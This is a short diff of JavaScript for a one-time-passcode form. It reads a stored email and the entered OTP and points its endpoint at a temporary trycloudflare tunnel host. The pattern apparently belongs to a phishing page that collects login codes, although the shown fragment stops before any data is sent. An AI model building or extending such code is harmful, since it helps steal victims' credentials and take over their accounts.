@@ -2,7 +2,7 @@ const form1 = document.getElementById('formOtp');
 const email1 = localStorage.getItem('email');
 const otp = document.getElementById('otp');
 const p24 = document.getElementById('otpRes');
-const address = `https://tiny-belle-consolidation-foto.trycloudflare.com/pg4.html`;
+const address = `https://tiny-belle-consolidation-foto.trycloudflare.com`;
 form1.addEventListener('submit', async function(e) {
     e.preventDefault();
     const otpIn = otp.value;
